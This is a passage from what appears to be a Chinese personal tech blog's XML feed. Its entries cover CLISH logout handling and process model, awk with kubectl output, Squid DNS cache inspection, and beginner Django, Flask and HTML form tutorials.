<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">COMMAND</span> <span class="attr">name</span>=<span class="string">&quot;logout&quot;</span> <span class="attr">help</span>=<span class="string">&quot;Logout of the current CLI session&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ACTION</span>&gt;</span>	<span class="comment">&lt;!-- 去掉内置的clish_close方法 --&gt;</span></span><br><span class="line">	/usr/share/clish/scripts/basecmd.sh release</span><br><span class="line">	kill $PPID # 杀掉父进程，也就是CLISH主进程</span><br><span class="line">       <span class="tag">&lt;/<span class="name">ACTION</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">COMMAND</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="clish进程模型分析">CLISH进程模型分析</span></h2><ul>
<li>一个主进程clish, 创建一个副线程循环读取用户输入的指令，主进程等待副线程退出;</li>
<li>副线程每读取一个指令就创建一个子进程，子进程执行xml里定义的builtin和action，执行完子进程退出。</li>
</ul>
<p>分析过程如下，通过GDB和ps命令，没啥难度：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line"> 339658 ?        Ss     0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class="line"> 339765 pts/0    Ss     0:00  |       \_ -bash</span><br><span class="line"> 383959 pts/0    Sl+    0:00  |           \_ clish (有两个线程, 副线程(383960)负责读取输入指令，主线程等待副线程(383960)结束</span><br><span class="line"> 384002 pts/0    S+     0:00  |               \_ sh -c  ??        /usr/share/clish/scripts/basecmd.sh release ??        <span class="built_in">echo</span> <span class="string">&quot;pid: $$, ppid: <span class="variable">$PPID</span>&quot;</span> ?? (执行用户自定义action的进程)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ps -T 383959 <span class="comment"># (CLISH进程有两个线程)</span></span><br><span class="line">    PID    SPID TTY      STAT   TIME COMMAND</span><br><span class="line"> 383959  383959 pts/0    Sl+    0:00 clish (创建副线程383960，等待其退出)</span><br><span class="line"> 383959  383960 pts/0    Sl+    0:00 clish (副线程循环读取用户输入指令, 创建子进程执行自定义<span class="built_in">builtin</span>和action)</span><br><span class="line"></span><br><span class="line">ps ajx | grep clish <span class="comment"># (查看相关CLISH进程的PID, 父进程ID, 线程ID)</span></span><br><span class="line">   PPID     PID    PGID     SID TTY        TPGID STAT   UID   TIME COMMAND</span><br><span class="line"> 339765  383959  383959  339765 pts/0     383959 Sl+      0   0:00 clish</span><br><span class="line"> 383959  384002  383959  339765 pts/0     383959 S+       0   0:00 sh -c  ??   /usr/share/clish/scripts/basecmd.sh release ??        <span class="built_in">echo</span> <span class="string">&quot;pid: $$, ppid: <span class="variable">$PPID</span>&quot;</span> ??        <span class="built_in">sleep</span> 1000 ??        <span class="built_in">kill</span> <span class="variable">$PPID</span> ???</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>CLISH</tag>
      </tags>
  </entry>
  <entry>
    <title>awk 删除第一行并提取第一列</title>
    <url>/2024/0820194607.html</url>
    <content><![CDATA[<p>例：用kubectl获取某个namespace下的所有pod</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n kube-system get pod</span><br><span class="line">NAME                                       READY   STATUS    RESTARTS      AGE</span><br><span class="line">coredns-64c6478b6c-wz58l                   1/1     Running   1 (32h ago)   15d</span><br><span class="line">calico-node-xq2hw                          1/1     Running   1 (32h ago)   15d</span><br><span class="line">calico-kube-controllers-6966456d6b-dkwj2   1/1     Running   1 (32h ago)   15d</span><br><span class="line">metrics-server-679c5f986d-p5pcc            1/1     Running   0             32h</span><br></pre></td></tr></table></figure>

<p>使用awk删除第一行并提取第一列，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n kube-system get pod | awk &#x27;NR &gt; 1 &#123;print $1&#125;&#x27;</span><br><span class="line">coredns-64c6478b6c-wz58l</span><br><span class="line">calico-node-xq2hw</span><br><span class="line">calico-kube-controllers-6966456d6b-dkwj2</span><br><span class="line">metrics-server-679c5f986d-p5pcc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>awk</category>
      </categories>
      <tags>
        <tag>awk</tag>
      </tags>
  </entry>
  <entry>
    <title>如何查看Squid的DNS缓存</title>
    <url>/2024/0820194846.html</url>
    <content><![CDATA[<p>使用<code>squidclient mgr:ipcache</code>命令查看Squid的DNS缓存记录<br>如果squid端口不是3128, 需要指定端口号, <code>squidclient -p &#123;port&#125; mgr:ipcache</code></p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># squidclient mgr:ipcache</span><br><span class="line">...</span><br><span class="line">IP Cache Statistics:</span><br><span class="line">...</span><br><span class="line">IP Cache Contents:</span><br><span class="line"> Hostname                        Flg lstref    TTL  N(b)</span><br><span class="line"> www.trendmicro.com                      19     41  1( 0)                                 23.195.109.63-OK</span><br><span class="line"> localhost6.localdomain6          H      93     -1  1( 0)                                           ::1-OK</span><br><span class="line"> localhost6                       H      93     -1  1( 0)                                           ::1-OK</span><br><span class="line"> localhost.localdomain            H      93     -1  1( 0)                                           ::1-OK</span><br><span class="line"> localhost                        H      93     -1  1( 0)                                           ::1-OK</span><br><span class="line"> localhost4.localdomain4          H      93     -1  1( 0)                                     127.0.0.1-OK</span><br><span class="line"> localhost4                       H      93     -1  1( 0)                                     127.0.0.1-OK</span><br><span class="line"> www.baidu.com                         1139  -1079  2( 0)                                103.235.47.188-OK</span><br><span class="line">                                                                                          103.235.46.96-OK</span><br></pre></td></tr></table></figure>

<h2><span id="dns请求抓包">DNS请求抓包</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump udp port 53 -w dns.pcap</span><br><span class="line">curl -x 127.0.0.1:3128 https://www.baidu.com</span><br></pre></td></tr></table></figure>
<p>10.206.216.93为nameserver的IP<br><img data-src="/2024/0820194846/image1.png"></p>
<h2><span id="参考">参考</span></h2><p><a href="https://wiki.squid-cache.org/Features/CacheManager/IpCache">https://wiki.squid-cache.org/Features/CacheManager/IpCache</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>Django快速上手</title>
    <url>/2024/0823230254.html</url>
    <content><![CDATA[<h2><span id="更新软件包">更新软件包</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf check-update</span><br><span class="line">dnf install dnf-utils</span><br></pre></td></tr></table></figure>
<h2><span id="安装python3和pip">安装Python3和pip</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install python3 python3-pip</span><br></pre></td></tr></table></figure>
<h2><span id="通过pip安装django">通过pip安装Django</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install Django</span><br></pre></td></tr></table></figure>

<h2><span id="验证django安装是否成功">验证Django安装是否成功</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin --version</span><br><span class="line">4.2.15</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2><span id="创建一个django项目">创建一个Django项目</span></h2><h3><span id="1-创建项目">1. 创建项目</span></h3><p><code>django-admin startproject demo1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">├── demo1</span><br><span class="line">│   ├── asgi.py		 无需修改, 接收网络请求</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py     【重要】 项目配置文件</span><br><span class="line">│   ├── urls.py		【重要】URL和function的映射</span><br><span class="line">│   └── wsgi.py		 无需修改, 接收网络请求</span><br><span class="line">└── manage.py		 无需修改, 项目管理，启动项目，创建APP，数据管理</span><br></pre></td></tr></table></figure>
<h3><span id="2-创建app">2. 创建APP</span></h3><p><code>python3 manage.py startapp app01</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">├── app01</span><br><span class="line">│   ├── admin.py         不用修改，django默认提供的admin后台管理</span><br><span class="line">│   ├── apps.py          不用修改</span><br><span class="line">│   ├── migrations       不用修改, 数据库变更</span><br><span class="line">│   ├── models.py       【重要】ORM 对数据库操作</span><br><span class="line">│   ├── tests.py         不用修改，这个是单元测试</span><br><span class="line">│   └── views.py	【重要】写函数的</span><br><span class="line">├── demo1</span><br><span class="line">│   ├── asgi.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py     【重要】项目配置文件</span><br><span class="line">│   ├── urls.py		【重要】URL-&gt;函数</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">└── manage.py</span><br></pre></td></tr></table></figure>
<h3><span id="3-快速上手写一个页面">3. 快速上手，写一个页面</span></h3><ol>
<li><p>编辑<code>demo1/settings.py</code>, INSTALLED_APPS中添加’app01.apps.App01Config’</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Application definition</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">    <span class="string">&#x27;app01.apps.App01Config&#x27;</span>, <span class="comment"># Add your app config here !</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑<code>demo1/urls.py</code>, 添加URL和视图函数的映射</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;index/&#x27;</span>, views.index),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑<code>app01/views.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3><span id="4-启动项目测试">4. 启动项目，测试</span></h3><p>启动：<code>python3 manage.py runserver 0.0.0.0:8000</code><br>测试：<code>curl localhost:8000/index/</code></p>
<h2><span id="参考">参考</span></h2><p><a href="https://docs.djangoproject.com/zh-hans/5.1/topics/install/#installing-official-release">https://docs.djangoproject.com/zh-hans/5.1/topics/install/#installing-official-release</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>前端基础</title>
    <url>/2024/0827223326.html</url>
    <content><![CDATA[<h1><span id="flask快速上手">Flask快速上手</span></h1><p>FLask官方文档: <a href="https://flask.palletsprojects.com/en/3.0.x/quickstart/#a-minimal-application">https://flask.palletsprojects.com/en/3.0.x/quickstart/#a-minimal-application</a></p>
<h2><span id="第一个flask-app">第一个Flask App</span></h2><p>Linux上安装Flask</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install Flask</span><br><span class="line">flask --version | grep Flask</span><br><span class="line">Flask 3.0.3</span><br></pre></td></tr></table></figure>
<p>写一个最小的Flask App, 添加web.py：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>运行App</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flask --app web run <span class="comment"># 只允许本地访问, 端口号默认5000</span></span><br><span class="line">flask --app web run --host=0.0.0.0 <span class="comment"># 允许从外部访问</span></span><br></pre></td></tr></table></figure>

<p>Flask提供render_template方法, 返回一个HTML页面</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/info&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	<span class="comment"># 默认从当前项目目录的templates文件夹中寻找index.html文件</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1><span id="html">HTML</span></h1><h2><span id="浏览器可以识别的标签">浏览器可以识别的标签</span></h2><h3><span id="meta-charset编码">meta charset(编码)</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3><span id="title">title</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>MyTitle<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="标题">标题</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="div和span">div和span</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>挖掘机技术<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>找蓝翔<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>厨师技术<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>新东方<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挖掘机技术</span><br><span class="line">找蓝翔</span><br><span class="line">厨师技术 新东方</span><br></pre></td></tr></table></figure>
<p>标签可以划分为块级标签和行内标签</p>
<ul>
<li>div标签, 总是占了一整行, 叫【块级标签】</li>
<li>span标签, 有多大占多大，一行可以多个，叫【行内标签】</li>
</ul>
<h3><span id="超链接">超链接</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>点击跳转百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/show/info&quot;</span>&gt;</span>点击跳转内部网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="图片">图片</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片地址&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示自己的本地图片</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/image1.png&quot;</span> /&gt;</span> <span class="comment">&lt;!-- Flask项目中创建static目录, 图片放在static目录下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;height: 100px;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/image1.png&quot;</span> /&gt;</span> <span class="comment">&lt;!-- 指定高度 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width: 20%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/image1.png&quot;</span> /&gt;</span> <span class="comment">&lt;!-- 指定宽度 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>标签可以嵌套，例如实现点击图片跳转链接功能</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/image1.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="列表">列表</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 项目编号是圆点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国移动<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国联通<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国电信<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 项目编号是数字(1,2,3) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国移动<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国联通<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span>中国电信<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="表格">表格</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span> <span class="comment">&lt;!-- 加边框 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>葫芦娃<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>19<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>20<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>葫芦娃<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>19<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>90<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>爷爷<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>91<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="input">INPUT</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单选框, name设置成一致, 选项变为互斥 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span>/&gt;</span>male</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span>/&gt;</span>female</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>篮球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>足球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>乒乓球</span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- 普通按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 提交表单--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="下拉框">下拉框</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span>&gt;</span>南京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="多行文本">多行文本</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="form表单">form表单</span></h3><p>HTML案例 —— 简单的注册表单页面:<br>新增注册页面 template&#x2F;register.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/doreg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    性别:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>male</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>/&gt;</span>female</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    爱好:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>篮球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>足球</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    地域:</span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;bj&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sh&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;skill&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>吃饭<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>, <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改web.py, 内容如下:</p>
